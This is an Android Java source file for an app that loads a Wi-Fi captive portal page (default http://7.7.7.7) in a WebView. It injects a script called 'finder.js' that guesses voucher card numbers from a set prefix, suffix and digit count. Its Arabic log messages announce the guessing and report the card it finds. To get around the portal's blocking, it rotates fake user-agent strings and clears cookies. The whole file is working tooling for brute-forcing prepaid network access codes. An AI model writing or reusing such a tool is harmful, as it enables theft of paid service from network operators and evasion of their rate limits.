package com.example.networkbrowser;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.view.View;
import android.webkit.*;
import android.widget.*;
import java.io.InputStream;
import java.nio.charset.StandardCharsets;
import java.util.Random;

public class MainActivity extends Activity {
    private WebView webView;
    private EditText urlBar, etPrefix, etSuffix, etDigits, etAttempts, etPause, etRetry, etStatusEvery, etThreads;
    private TextView statusText, logText, voucherResult;
    private SharedPreferences prefs;
    private String finderJs = "";
    private String targetUrl = "";
    private StringBuilder logBuf = new StringBuilder();
    private Handler uiHandler = new Handler(Looper.getMainLooper());
    private boolean logUpdatePending = false;
    private boolean stoppedState = false;
    private final Random rand = new Random();
    private long lastAttemptTime = 0;
    private long globalBlockUntil = 0;
    private boolean isRunning = false;

    private final String[] UAS = {
        "Mozilla/5.0 (Linux; Android 13; SM-S911B) AppleWebKit/537.36 Chrome/118.0 Mobile",
        "Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 Chrome/115.0 Mobile",
        "Mozilla/5.0 (Linux; Android 11; SM-A515F) AppleWebKit/537.36 Chrome/110.0 Mobile",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 Version/16.0 Mobile"
    };

    @SuppressLint("SetJavaScriptEnabled")
    @Override protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        prefs = getSharedPreferences("finder", MODE_PRIVATE);

        urlBar = findViewById(R.id.urlBar);
        etPrefix = findViewById(R.id.etPrefix);
        etSuffix = findViewById(R.id.etSuffix);
        etDigits = findViewById(R.id.etDigits);
        etAttempts = findViewById(R.id.etAttempts);
        etPause = findViewById(R.id.etPause);
        etRetry = findViewById(R.id.etRetry);
        etStatusEvery = findViewById(R.id.etStatusEvery);
        etThreads = findViewById(R.id.etThreads);
        statusText = findViewById(R.id.statusText);
        logText = findViewById(R.id.logText);
        voucherResult = findViewById(R.id.voucherResult);
        webView = findViewById(R.id.webView);

        urlBar.setText(prefs.getString("url", "http://7.7.7.7/index.html"));
        etPrefix.setText(prefs.getString("prefix", "5"));
        etSuffix.setText(prefs.getString("suffix", "31"));
        etDigits.setText(prefs.getString("digits", "7"));
        etAttempts.setText(prefs.getString("attempts", "1000"));
        etPause.setText(prefs.getString("pause", "1000"));
        etRetry.setText(prefs.getString("retry", "1000"));
        etStatusEvery.setText(prefs.getString("statusEvery", "50"));
        etThreads.setText("1"); // شاشة واحدة فقط

        try {
            InputStream is = getAssets().open("finder.js");
            byte[] buf = new byte[is.available()];
            is.read(buf); is.close();
            finderJs = new String(buf, StandardCharsets.UTF_8);
        } catch (Exception e) { appendLog("خطأ تحميل JS: " + e.getMessage()); }

        WebSettings s = webView.getSettings();
        s.setJavaScriptEnabled(true);
        s.setDomStorageEnabled(true);
        s.setMixedContentMode(WebSettings.MIXED_CONTENT_ALWAYS_ALLOW);
        CookieManager.getInstance().setAcceptThirdPartyCookies(webView, true);
        webView.addJavascriptInterface(new Bridge(0), "AndroidBridge0");

        webView.setWebViewClient(new WebViewClient() {
            @Override public void onPageFinished(WebView view, String url) {
                if (isRunning) {
                    String p = etPrefix.getText().toString().trim();
                    String s = etSuffix.getText().toString().trim();
                    int d = parseInt(etDigits, 7);
                    int a = parseInt(etAttempts, 1000);
                    int pz = parseInt(etPause, 1000);
                    String cfg = "window.FINDER_CONFIG={id:0,prefix:'" + p + "',suffix:'" + s + "',digits:" + d + ",attempts:" + a + ",pause:" + pz + "};";
                    view.evaluateJavascript(cfg, null);
                    view.evaluateJavascript(finderJs, null);
                    appendLog("[W0] 🔄 تم إعادة حقن السكربت بعد التحديث");
                }
            }
        });

        findViewById(R.id.btnGo).setOnClickListener(v -> {
            targetUrl = urlBar.getText().toString().trim();
            if (!targetUrl.startsWith("http")) targetUrl = "http://" + targetUrl;
            prefs.edit().putString("url", targetUrl).apply();
            webView.getSettings().setUserAgentString(UAS[rand.nextInt(UAS.length)]);
            webView.loadUrl(targetUrl);
            appendLog("تم تحميل الرابط");
        });

        findViewById(R.id.btnFinder).setOnClickListener(v -> {
            View panel = findViewById(R.id.panel);
            panel.setVisibility(panel.getVisibility() == View.VISIBLE ? View.GONE : View.VISIBLE);
        });

        findViewById(R.id.btnBack).setOnClickListener(v -> { if (webView.canGoBack()) webView.goBack(); });
        findViewById(R.id.btnForward).setOnClickListener(v -> { if (webView.canGoForward()) webView.goForward(); });
        findViewById(R.id.btnRefresh).setOnClickListener(v -> webView.reload());

        findViewById(R.id.btnStart).setOnClickListener(v -> startAll());
        findViewById(R.id.btnStop).setOnClickListener(v -> stopAll());
        findViewById(R.id.btnClear).setOnClickListener(v -> {
            prefs.edit().remove("tried_" + targetUrl).apply();
            CookieManager.getInstance().removeAllCookies(null);
            CookieManager.getInstance().flush();
            logBuf.setLength(0);
            logText.setText("");
            voucherResult.setVisibility(View.GONE);
            appendLog("🗑️ تم مسح الكوكيز والأرقام");
        });

        targetUrl = urlBar.getText().toString();
        webView.getSettings().setUserAgentString(UAS[rand.nextInt(UAS.length)]);
        webView.loadUrl(targetUrl);
    }

    private void startAll() {
        stoppedState = false;
        isRunning = true;
        prefs.edit().putString("prefix", etPrefix.getText().toString()).putString("suffix", etSuffix.getText().toString())
            .putString("digits", etDigits.getText().toString()).putString("attempts", etAttempts.getText().toString())
            .putString("pause", etPause.getText().toString()).putString("retry", etRetry.getText().toString())
            .putString("statusEvery", etStatusEvery.getText().toString()).apply();

        String p = etPrefix.getText().toString().trim();
        String s = etSuffix.getText().toString().trim();
        int d = parseInt(etDigits, 7);
        int a = parseInt(etAttempts, 1000);
        int pz = parseInt(etPause, 1000);

        appendLog("▶ بدء التخمين (شاشة واحدة)");
        voucherResult.setVisibility(View.GONE);
        statusText.setText("جاري التخمين...");

        webView.getSettings().setUserAgentString(UAS[rand.nextInt(UAS.length)]);
        String cfg = "window.FINDER_CONFIG={id:0,prefix:'" + p + "',suffix:'" + s + "',digits:" + d + ",attempts:" + a + ",pause:" + pz + "};";
        webView.evaluateJavascript(cfg, null);
        webView.evaluateJavascript(finderJs, null);
    }

    private void stopAll() {
        stoppedState = true;
        isRunning = false;
        webView.evaluateJavascript("window.stopFinder && window.stopFinder();", null);
        statusText.setText("⏹ تم الإيقاف");
        appendLog("⏹ تم الإيقاف");
    }

    private int parseInt(EditText e, int def) {
        try { return Integer.parseInt(e.getText().toString().trim()); } catch (Exception ex) { return def; }
    }

    private void appendLog(String msg) {
        logBuf.append(msg).append('\n');
        if (logBuf.length() > 20000) logBuf.delete(0, 15000);
        if (!logUpdatePending) {
            logUpdatePending = true;
            uiHandler.postDelayed(() -> {
                logText.setText(logBuf.toString());
                findViewById(R.id.logScroll).post(() -> ((ScrollView)findViewById(R.id.logScroll)).fullScroll(View.FOCUS_DOWN));
                logUpdatePending = false;
            }, 100);
        }
    }

    public class Bridge {
        private final int id;
        public Bridge(int id) { this.id = id; }
        
        @JavascriptInterface public void log(String m) { runOnUiThread(() -> appendLog("[W" + id + "] " + m)); }
        @JavascriptInterface public void progress(int c, int t, String v) { runOnUiThread(() -> statusText.setText("[" + c + "/" + t + "] " + v)); }
        @JavascriptInterface public void clearCookies() { runOnUiThread(() -> { CookieManager.getInstance().removeAllCookies(null); CookieManager.getInstance().flush(); appendLog("🧹 تم مسح الكوكيز"); }); }
        @JavascriptInterface public void found(String v, String st) {
            runOnUiThread(() -> {
                appendLog("✅✅✅ وجد الكرت: " + v);
                statusText.setText("✅ وجد الكرت!");
                voucherResult.setText("✅ الكرت: " + v);
                voucherResult.setVisibility(View.VISIBLE);
                Toast.makeText(MainActivity.this, "✅ " + v, Toast.LENGTH_LONG).show();
                stopAll();
            });
        }
    }
}
